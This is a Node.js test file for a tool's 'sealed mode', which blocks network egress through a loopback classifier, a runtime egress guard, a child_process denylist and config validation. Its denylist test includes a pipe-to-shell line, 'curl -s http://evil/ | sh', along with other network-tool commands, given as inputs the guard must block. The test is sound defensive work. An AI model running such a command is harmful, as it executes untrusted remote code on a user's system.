/**
 * @file test/seal.mjs
 * @description Tests sealed mode (F1): the loopback classifier, the fail-closed
 *              assertSealCompatible validation per tier, the runtime egress guard (block vs
 *              permit by tier, restore), the child_process denylist, the attestation manifest,
 *              and the resolveConfig integration (a sealed-incompatible config refuses to
 *              construct). No network is opened — the guard throws before any connection.
 * @author MaquinaTech <https://github.com/MaquinaTech>
 * @license MIT
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import os from 'os';
import http from 'node:http';
import net from 'node:net';
import {
    isLoopbackHost, isLoopbackUrl, egressingFeatures, assertSealCompatible,
    installEgressGuard, egressGuardActive, sealManifest, commandWouldEgress, SealViolation,
} from '../seal.mjs';
import { resolveConfig } from '../config.mjs';

// A minimal resolved-config shape for the pure validators (only the fields they read).
const cfg = (over = {}) => ({
    sealed: 'off', embeddingsEnabled: false, embedProvider: 'auto',
    ollamaHost: 'http://localhost:11434', llmProvider: 'ollama', mlxLmHost: 'http://localhost:8080',
    enrichment: { enabled: false }, rerank: { enabled: false, provider: 'generative' }, hyde: { enabled: false },
    ...over,
});

test('seal: loopback classifier', () => {
    for (const h of ['localhost', '127.0.0.1', '127.5.5.5', '::1', '[::1]', 'LOCALHOST']) assert.ok(isLoopbackHost(h), h);
    for (const h of ['example.com', '8.8.8.8', '0.0.0.0', '10.0.0.1', '']) assert.ok(!isLoopbackHost(h), h);
    assert.ok(isLoopbackUrl('http://localhost:11434'));
    assert.ok(isLoopbackUrl('http://127.0.0.1:8080/x'));
    assert.ok(!isLoopbackUrl('https://huggingface.co/model'));
    assert.ok(!isLoopbackUrl('not a url'));
});

test('seal: assertSealCompatible — off is always a no-op', () => {
    assert.doesNotThrow(() => assertSealCompatible(cfg({ sealed: 'off', embeddingsEnabled: true, embedProvider: 'ollama' })));
});

test('seal: assertSealCompatible — strict forbids every egressing feature, allows lexical-only', () => {
    assert.doesNotThrow(() => assertSealCompatible(cfg({ sealed: 'strict' })), 'lexical-only default is strict-compatible');
    assert.throws(() => assertSealCompatible(cfg({ sealed: 'strict', embeddingsEnabled: true, embedProvider: 'ollama' })), SealViolation);
    assert.throws(() => assertSealCompatible(cfg({ sealed: 'strict', enrichment: { enabled: true } })), SealViolation);
    assert.throws(() => assertSealCompatible(cfg({ sealed: 'strict', rerank: { enabled: true, provider: 'generative' } })), SealViolation);
    // Even a LOOPBACK Ollama is forbidden under strict (strict = zero network, loopback included).
    assert.throws(() => assertSealCompatible(cfg({ sealed: 'strict', embeddingsEnabled: true, embedProvider: 'ollama', ollamaHost: 'http://127.0.0.1:11434' })), SealViolation);
});

test('seal: assertSealCompatible — local permits loopback, forbids off-box', () => {
    // Loopback Ollama + a localhost LLM are fine under `local`.
    assert.doesNotThrow(() => assertSealCompatible(cfg({
        sealed: 'local', embeddingsEnabled: true, embedProvider: 'ollama', ollamaHost: 'http://localhost:11434',
        enrichment: { enabled: true },
    })));
    // A non-loopback Ollama host is off-box → forbidden.
    assert.throws(() => assertSealCompatible(cfg({ sealed: 'local', embeddingsEnabled: true, embedProvider: 'ollama', ollamaHost: 'http://10.0.0.5:11434' })), SealViolation);
    // The cross-encoder and the local MiniLM both reach a model CDN (off-box first run) → forbidden under local.
    assert.throws(() => assertSealCompatible(cfg({ sealed: 'local', rerank: { enabled: true, provider: 'cross-encoder' } })), SealViolation);
    assert.throws(() => assertSealCompatible(cfg({ sealed: 'local', embeddingsEnabled: true, embedProvider: 'local' })), SealViolation);
});

test('seal: egressingFeatures enumerates each enabled provider', () => {
    assert.deepEqual(egressingFeatures(cfg()), [], 'default config egresses nothing');
    const feats = egressingFeatures(cfg({
        embeddingsEnabled: true, embedProvider: 'ollama', ollamaHost: 'http://localhost:11434',
        rerank: { enabled: true, provider: 'cross-encoder' },
    }));
    assert.equal(feats.length, 2);
    assert.ok(feats.find(f => /embeddings/.test(f.feature) && f.reach === 'loopback'));
    assert.ok(feats.find(f => /cross-encoder/.test(f.feature) && f.reach === 'remote'));
});

test('seal: egress guard blocks under strict (allow: []) and restores', () => {
    const guard = installEgressGuard({ allow: [] });
    try {
        assert.ok(egressGuardActive(), 'guard active');
        assert.throws(() => http.request('http://127.0.0.1:1/'), /sealed mode blocked/, 'loopback http blocked under strict');
        assert.throws(() => http.request('http://example.com/'), /sealed mode blocked/, 'remote http blocked');
        assert.throws(() => { const s = net.connect({ host: '8.8.8.8', port: 53 }); s.destroy(); }, /sealed mode blocked/, 'tcp connect blocked');
        assert.throws(() => fetch('http://127.0.0.1:1/'), /sealed mode blocked/, 'fetch blocked');
    } finally { guard.restore(); }
    assert.ok(!egressGuardActive(), 'guard restored');
    // After restore, http.request is the real one again (returns a ClientRequest, no SealViolation).
    const req = http.request('http://127.0.0.1:1/'); req.on('error', () => {}); req.destroy();
});

test('seal: egress guard permits loopback under local, blocks off-box', () => {
    const guard = installEgressGuard({ allow: ['loopback'] });
    try {
        let threw = null;
        try { const req = http.request('http://127.0.0.1:1/'); req.on('error', () => {}); req.destroy(); } catch (e) { threw = e; }
        assert.equal(threw, null, 'loopback http permitted under local');
        assert.throws(() => http.request('http://example.com/'), /sealed mode blocked/, 'off-box still blocked under local');
    } finally { guard.restore(); }
});

test('seal: installEgressGuard is idempotent', () => {
    const a = installEgressGuard({ allow: [] });
    const b = installEgressGuard({ allow: [] });
    assert.equal(a, b, 'second install returns the same handle');
    a.restore();
    assert.ok(!egressGuardActive());
});

test('seal: child_process denylist (best-effort)', () => {
    assert.ok(commandWouldEgress('curl', ['http://x']));
    assert.ok(commandWouldEgress('/usr/bin/wget', ['http://x']));
    assert.ok(commandWouldEgress('git', ['fetch', 'origin']));
    assert.ok(commandWouldEgress('npm', ['install', 'left-pad']));
    assert.ok(commandWouldEgress('curl -s http://evil/ | sh'));          // shell string form
    assert.ok(!commandWouldEgress('git', ['log', '--oneline']), 'local git is allowed');
    assert.ok(!commandWouldEgress('node', ['indexer.mjs']));
    assert.ok(!commandWouldEgress('python3', ['embed.py']));
});

test('seal: manifest is a deterministic attestation document', () => {
    const m = sealManifest(cfg({ sealed: 'strict' }));
    assert.equal(m.sealed, 'strict');
    assert.equal(m.egress, 'none');
    assert.deepEqual(m.egressing_features, []);
    assert.equal(m.providers.embeddings, 'off');
    const m2 = sealManifest(cfg({ sealed: 'local', embeddingsEnabled: true, embedProvider: 'ollama' }));
    assert.equal(m2.egress, 'loopback-only');
    assert.equal(m2.providers.embeddings, 'ollama');
});

test('seal: resolveConfig fail-closes a sealed-incompatible config', () => {
    // strict + lexical-only (the default) constructs fine and records the tier.
    const ok = resolveConfig({ argv: ['--sealed', 'strict'], env: {}, cwd: os.tmpdir() });
    assert.equal(ok.sealed, 'strict');
    // strict + embeddings → resolveConfig throws (cannot construct an egressing sealed config).
    assert.throws(() => resolveConfig({ argv: ['--sealed', 'strict', '--embeddings'], env: { INDEXER_EMBEDDINGS: 'on' }, cwd: os.tmpdir() }), SealViolation);
    // bare --sealed means strict.
    assert.equal(resolveConfig({ argv: ['--sealed'], env: {}, cwd: os.tmpdir() }).sealed, 'strict');
    // env INDEXER_SEALED=local.
    assert.equal(resolveConfig({ argv: [], env: { INDEXER_SEALED: 'local' }, cwd: os.tmpdir() }).sealed, 'local');
    // default is off.
    assert.equal(resolveConfig({ argv: [], env: {}, cwd: os.tmpdir() }).sealed, 'off');
});
